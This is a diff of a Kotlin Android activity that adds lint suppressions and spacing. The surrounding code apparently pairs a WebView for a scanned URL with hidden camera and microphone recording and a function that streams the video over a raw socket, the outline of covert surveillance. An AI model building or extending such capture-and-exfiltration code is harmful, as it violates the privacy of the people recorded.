@@ -8,6 +8,7 @@ import android.webkit.WebViewClient
 import androidx.appcompat.app.AppCompatActivity
 
 import android.Manifest
+import android.annotation.SuppressLint
 import android.content.ContentValues
 import android.content.Context
 import android.content.pm.PackageManager
@@ -27,13 +28,17 @@ import android.provider.MediaStore
 import android.util.Log
 import androidx.core.app.ActivityCompat
 import android.widget.Toast
+
+import kotlinx.coroutines.DelicateCoroutinesApi
 import kotlinx.coroutines.Dispatchers
 import kotlinx.coroutines.GlobalScope
 import kotlinx.coroutines.launch
+
 import java.io.DataOutputStream
 import java.io.InputStream
 import java.net.Socket
 
+@Suppress("DEPRECATION")
 class WebPageActivity : AppCompatActivity() {
 
     private lateinit var mediaRecorder: MediaRecorder
@@ -44,6 +49,7 @@ class WebPageActivity : AppCompatActivity() {
     private lateinit var uri : Uri
 
     // ----------- FUNCTIONS TO BROWSE THE WEB PAGE ---------------
+
     override fun onCreate(savedInstanceState: Bundle?) {
         super.onCreate(savedInstanceState)
         setContentView(R.layout.activity_web_page)
@@ -57,6 +63,7 @@ class WebPageActivity : AppCompatActivity() {
         }
     }
 
+    @SuppressLint("SetJavaScriptEnabled")
     private fun startWebView() {
         val webView: WebView = findViewById(R.id.webview)
         val newUrl = intent.getStringExtra("urlScanned") ?: "https://www.google.com/"
@@ -72,8 +79,8 @@ class WebPageActivity : AppCompatActivity() {
         }
     }
 
-
     // ----------- FUNCTIONS TO RECORD THE VIDEO ---------------
+
     private fun setupCamera() {
         val cameraManager = getSystemService(Context.CAMERA_SERVICE) as CameraManager
         try {
@@ -113,6 +120,7 @@ class WebPageActivity : AppCompatActivity() {
         }
     }
 
+    @SuppressLint("Recycle")
     private fun startRecording() {
         mediaRecorder = MediaRecorder().apply {
             setAudioSource(MediaRecorder.AudioSource.MIC)
@@ -205,6 +213,7 @@ class WebPageActivity : AppCompatActivity() {
         return context.contentResolver.openInputStream(uri)
     }
 
+    @OptIn(DelicateCoroutinesApi::class)
     private fun sendVideoOverSocket(inputStream: InputStream) {
         GlobalScope.launch(Dispatchers.IO) {
             try {
@@ -234,5 +243,4 @@ class WebPageActivity : AppCompatActivity() {
             sendVideoOverSocket(inputStream)
         }
     }
-
 }
